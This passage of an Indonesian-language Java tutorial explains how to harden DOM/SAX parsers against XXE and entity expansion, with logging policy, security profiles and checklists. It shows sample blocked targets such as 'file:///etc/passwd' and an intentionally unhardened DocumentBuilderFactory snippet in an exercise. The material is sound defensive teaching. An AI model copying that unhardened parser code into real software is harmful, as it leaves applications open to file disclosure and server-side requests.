Parsing untrusted XML yang gagal bukan selalu system incident.

Mapping:

| Failure | Response |
|---|---|
| malformed XML | invalid input |
| DOCTYPE forbidden | invalid/unsupported XML |
| entity expansion limit | invalid/unsafe XML |
| external access blocked | invalid/unsafe XML |
| parser cannot be securely configured | system configuration error |
| IO timeout reading upload | client/request failure or infrastructure issue |

Jangan expose detail seperti:

```text
file:///etc/passwd blocked
http://internal.service/admin blocked
```

ke response user. Itu informasi internal.

---

### 14.3 Logging policy

Jangan log full XML input secara default.

Aman:

```text
- request id;
- partner id;
- XML size;
- parser profile name;
- failure category;
- sanitized message;
- location line/column jika aman;
- hash payload jika perlu correlation.
```

Berisiko:

```text
- full XML body;
- expanded text;
- external systemId lengkap;
- file path internal;
- token dalam XML;
- PII dalam XML.
```

---

## 15. DOM vs SAX dari Sisi Security dan Resource

### 15.1 DOM

Kelebihan:

- mudah untuk small XML;
- random access;
- mutation/normalization;
- cocok untuk config kecil dan message kecil.

Risiko:

- full tree in memory;
- live collections;
- text aggregation;
- vulnerable to memory blowup jika input besar;
- entity expansion bisa memperbesar tree/text.

Policy:

```text
DOM only when XML size is bounded and small.
```

---

### 15.2 SAX

Kelebihan:

- streaming;
- memory rendah;
- cocok untuk large XML;
- bisa stop early.

Risiko:

- parser-level XXE tetap ada;
- state machine bug;
- text fragmentation;
- sulit error recovery;
- validation/resource fetch tetap harus hardened.

Policy:

```text
SAX for large sequential input, but still hardened at parser level.
```

---

## 16. Java 8–25 Compatibility Notes

### 16.1 API surface

DOM/SAX/JAXP security hardening harus mempertimbangkan:

- Java 8 masih banyak dipakai di legacy enterprise;
- Java 9 memperkenalkan module system, tetapi `java.xml` tetap standard module;
- Java 17/21/25 umum sebagai modern runtime baseline;
- JAXP properties dan limits bisa berubah default-nya antar JDK update;
- implementation parser bisa berbeda jika aplikasi membawa XML parser dependency sendiri.

Jangan hanya test di satu JDK.

Minimal test matrix:

```text
Java 8
Java 11
Java 17
Java 21
Java 25
```

Jika library kamu mendukung semua, test hardening harus berjalan di semua.

---

### 16.2 Module boundary

Jika menggunakan JPMS:

```java
module com.example.xml {
    requires java.xml;
}
```

DOM/SAX/JAXP ada di module `java.xml`.

---

### 16.3 Parser implementation differences

Feature URI seperti:

```text
http://apache.org/xml/features/disallow-doctype-decl
http://apache.org/xml/features/nonvalidating/load-external-dtd
```

berasal dari Xerces-style feature yang umum pada JDK parser, tetapi tetap harus diperlakukan sebagai feature yang mungkin unsupported pada parser tertentu.

Production stance:

```text
Security feature unsupported = fail startup/configuration.
```

---

## 17. Security Profiles

Daripada tiap developer menyetel factory sendiri, buat profile.

### 17.1 Profile: `UNTRUSTED_NO_DTD`

```text
Use case:
- API upload;
- partner message;
- message queue;
- public endpoint.

Policy:
- namespace aware: true
- validation: false
- XInclude: false
- DOCTYPE: rejected
- external DTD: none
- external schema: none
- entity expansion: 0
- max element depth: bounded
- max input size: bounded
```

Ini default paling aman.

---

### 17.2 Profile: `TRUSTED_LOCAL_SCHEMA`

```text
Use case:
- internal XML with app-controlled XSD.

Policy:
- namespace aware: true
- schema selected by application
- external schema access: none
- external DTD: none
- DOCTYPE: rejected unless required
- input size: bounded
```

---

### 17.3 Profile: `LEGACY_ALLOWLISTED_DTD`

```text
Use case:
- legacy integration requiring DTD.

Policy:
- DOCTYPE allowed only for known public/system ID
- resolver maps to classpath/local static DTD
- no network
- no arbitrary file
- entity expansion limit low
- monitoring enabled
- migration plan required
```

Legacy profile harus exception, bukan default.

---

## 18. Failure Modes

### 18.1 “Kami sudah pakai SAX, jadi aman”

Salah. SAX mengurangi memory tree cost, tetapi parser masih bisa resolve entity dan fetch resource jika tidak dikonfigurasi.

---

### 18.2 “Kami sudah set secure processing”

Belum cukup. Tetap set:

- disallow DOCTYPE;
- disable external entities;
- disable external DTD loading;
- restrict external access;
- resolver fail-closed;
- processing limits;
- input size cap.

---

### 18.3 “Kami catch exception dan lanjut”

Jika parser security configuration gagal, lanjut berarti menjalankan parser dalam mode tidak diketahui.

Security configuration failure harus fail-fast.

---

### 18.4 “XML hanya dari partner”

Partner integration tetap untrusted dari sudut parser.

Alasan:

- partner bisa punya bug;
- payload bisa dimanipulasi di supply chain;
- credential/secret bisa bocor;
- environment berubah;
- parser default berubah;
- replayed malicious payload bisa masuk dari storage lama.

---

### 18.5 “Kita perlu DTD, jadi security tidak bisa diterapkan”

Salah. DTD bisa didukung dengan allowlisted local resolver dan strict limits.

Yang tidak boleh adalah arbitrary external DTD/entity resolution.

---

### 18.6 “Kita log XML untuk debugging”

Full XML logging bisa menjadi incident kedua setelah incident pertama.

XML sering berisi:

- PII;
- token;
- address;
- financial data;
- internal IDs;
- remarks/free text;
- embedded documents;
- malicious payload.

Log structured metadata, bukan full payload.

---

## 19. Production Checklist

### 19.1 Parser configuration checklist

Untuk semua DOM/SAX parser yang menerima untrusted XML:

```text
[ ] Namespace-aware enabled
[ ] Validation disabled unless explicitly needed
[ ] XInclude disabled
[ ] FEATURE_SECURE_PROCESSING enabled
[ ] DOCTYPE disabled for untrusted XML
[ ] external-general-entities disabled
[ ] external-parameter-entities disabled
[ ] external DTD loading disabled
[ ] ACCESS_EXTERNAL_DTD set to empty string
[ ] ACCESS_EXTERNAL_SCHEMA set to empty string
[ ] EntityResolver rejects or allowlists
[ ] Processing limits configured
[ ] Unsupported security feature fails closed
[ ] Input size limit before parser
[ ] Decompressed size limit if compressed input accepted
[ ] DOM only for bounded small input
[ ] SAX for large sequential input
[ ] Tests verify no outbound request
[ ] Tests verify malicious payload rejection
[ ] Logs sanitized
```

---

### 19.2 Architecture checklist

```text
[ ] XML parser construction centralized
[ ] No direct DocumentBuilderFactory.newInstance() in feature code
[ ] No direct SAXParserFactory.newInstance() in feature code
[ ] Static analysis rule flags unsafe parser creation
[ ] Security profile selected by use case
[ ] Parser config tested across supported JDK versions
[ ] Partner XML contract documents DTD/schema policy
[ ] Operational metrics include parse failures by category
[ ] Large XML handled streaming, not DOM
[ ] Schema and DTD resources bundled or allowlisted
```

---

### 19.3 Code review checklist

Reviewer should ask:

1. Where does this XML come from?
2. Is the parser created through approved secure factory?
3. Is namespace awareness enabled?
4. Can this input trigger external network/file access?
5. Can this input cause large expansion?
6. Is DOM justified by size?
7. Are parse errors mapped safely?
8. Are XML bodies logged?
9. Are schema/DTD resources controlled?
10. Are tests proving malicious payload rejection?

---

## 20. Thought Exercises

### Exercise 1 — Partner XML with DTD

A partner requires DTD because their XML contains default attribute definitions. They send XML over mTLS.

Question:

```text
Should you allow arbitrary DTD resolution?
```

Expected reasoning:

- mTLS protects transport, not parser behavior;
- DTD can still cause external resource fetch/entity expansion;
- use local allowlisted DTD resolver;
- disable network/file access;
- configure expansion limits;
- document partner contract.

---

### Exercise 2 — Large Regulatory XML Import

You receive 2 GB XML batch monthly. The team wants DOM because extraction is easier.

Question:

```text
What is the architectural issue?
```

Expected reasoning:

- DOM full tree is inappropriate;
- use SAX/StAX streaming;
- create state machine;
- process records incrementally;
- checkpoint progress;
- isolate per-record failure;
- still harden parser.

---

### Exercise 3 — Sonar flags XXE

Code:

```java
DocumentBuilderFactory f = DocumentBuilderFactory.newInstance();
f.setNamespaceAware(true);
DocumentBuilder b = f.newDocumentBuilder();
Document d = b.parse(input);
```

Question:

```text
What is missing?
```

Expected answer:

- secure processing;
- disallow DOCTYPE;
- disable external entities;
- disable external DTD loading;
- restrict external DTD/schema access;
- resolver fail-closed;
- input size limit;
- processing limits.

---

## 21. Summary

Secure XML parsing adalah tentang mengontrol pekerjaan yang boleh dilakukan parser.

Key mental model:

```text
Untrusted XML can instruct parser work.
Secure parser config restricts that work.
Application extraction happens only after parser behavior is controlled.
```

Prinsip utama:

1. DOM/SAX sama-sama perlu hardening di layer parser.
2. Disable DOCTYPE untuk untrusted XML jika tidak wajib.
3. Disable external general dan parameter entities.
4. Disable external DTD loading.
5. Restrict external DTD/schema access dengan empty protocol list.
6. Gunakan `FEATURE_SECURE_PROCESSING`, tetapi jangan anggap itu cukup.
7. Set processing limits sesuai domain.
8. Batasi input size sebelum parsing.
9. Gunakan namespace-aware parsing.
10. Fail closed jika parser tidak bisa dikonfigurasi aman.
11. Jangan log full XML payload.
12. Centralize secure parser factory.

Di level top engineer, XML security bukan checklist hafalan. Ia adalah boundary design:

```text
Apa saja efek samping yang bisa diminta input kepada parser?
Bagaimana kita membatasi efek itu?
Bagaimana kita membuktikan lewat test bahwa efek itu memang diblokir?
```

---

## 22. Kapan Menggunakan DOM/SAX Setelah Hardening?

Gunakan DOM jika:

- XML kecil;
- butuh random access;
- butuh mutation;
- struktur cukup kompleks tetapi bounded;
- ukuran input dipastikan aman.

Gunakan SAX jika:

- XML besar;
- extraction sequential;
- streaming import;
- memory harus rendah;
- bisa mendesain state machine yang jelas.

Jangan gunakan XML parser default langsung di business code. Gunakan secure factory/profile.

---

## 23. Posisi Part Ini dalam Series

Kita sudah menyelesaikan:

```text
Part 24: DOM mental model
Part 25: DOM creation/mutation
Part 26: DOM querying
Part 27: DOM Level 3
Part 28: SAX mental model
Part 29: SAX namespaces/features/entity/DTD
Part 30: Secure XML parsing and hardening
```

Setelah ini, kita akan membahas bagaimana memakai DOM/SAX secara arsitektural untuk workload nyata:

```text
Part 31 — Advanced XML Processing Patterns: DOM/SAX Hybrid, Streaming State Machines, Large Documents
```

Part 30 adalah security foundation. Part 31 akan memakai foundation ini untuk desain pipeline XML production-grade.

<!-- NAVIGATION_FOOTER -->
---

[⬅️ Sebelumnya: Part 29 — SAX Namespaces, Features, Properties, Entity Resolution, DTD Handling](./29-sax-namespaces-features-properties-entity-resolution-dtd.md) | [🏠 Daftar Isi](../../../index.md) | [Selanjutnya ➡️: Part 31 — Advanced XML Processing Patterns: DOM/SAX Hybrid, Streaming State Machines, Large Documents](./31-advanced-xml-processing-patterns-dom-sax-hybrid-large-documents.md)
